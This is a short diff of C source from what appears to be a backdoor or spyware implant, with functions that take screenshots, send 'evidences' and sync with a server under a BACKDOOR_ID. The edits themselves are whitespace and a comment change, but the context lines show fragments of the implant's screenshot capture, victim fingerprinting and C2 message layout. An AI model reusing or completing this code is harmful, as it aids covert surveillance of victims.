@@ -108,7 +108,7 @@ BOOL SendEvidences()
 //	else
 //		OutputDebugString(L"[*] No DeviceInfo\n");
 #endif
-
+	
 	// SCREENSHOT
 	ULONG uScreenShotLen;
 	PBYTE pJPEGBuffer = TakeScreenshot(&uScreenShotLen);
@@ -227,7 +227,7 @@ BOOL SyncWithServer()
 	pInstanceId = (PBYTE)malloc(20);
 	GetUserUniqueHash(pInstanceId, 20);
 
-	// proto_v + rand + sha1(conf_key + rand) + bdoor_id(padded) + instance_id + subtype + randpool	
+	// proto_v + rand + sha1(conf_key + rand) + bdoor_id(padded) + instance_id + subtype + randpool	 (FIXME)
 	ULONG uRandPoolLen = GetRandomInt(128, 1024);
 	ULONG uCryptBufferLen = Align(sizeof(ULONG) + 16 + 20 + strlen(BACKDOOR_ID) + 2 + 20 + sizeof(ULONG), 16);
 	ULONG uMessageLen = uCryptBufferLen + uRandPoolLen;
@@ -577,6 +577,7 @@ ULONG CommandHash(ULONG uProtoCmd, PBYTE pMessage, ULONG uMessageLen, PBYTE pEnc
 
 	uOutClear = sizeof(ULONG) + uMessageLen + 20;
 	uOut = uOutClear;
+
 	if (uOut % 16)
 		uOut += 16 - (uOut % 16);
 	else
